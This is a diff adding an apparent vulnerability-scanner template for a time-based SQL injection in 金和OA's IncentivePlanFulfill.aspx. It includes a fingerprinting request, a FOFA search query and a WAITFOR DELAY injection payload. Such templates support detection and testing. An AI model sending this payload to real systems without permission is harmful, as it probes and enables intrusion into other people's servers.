@@ -1,0 +1,27 @@
+id: poc-yaml-jinhe-oa-incentiveplanfulfill-sqli
+info:
+  name: 金和OA IncentivePlanFulfill.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(1,5)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /c6/Jhsoft.Web.login/PassWordNew.aspx
+  expression: status_code == 200 && contains(body,"JHSoft")
+- method: GET
+  path: /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:{{.t1}}%27--&TVersion=1
+  expression: 'status_code == 200 &&
+
+    body == "" &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
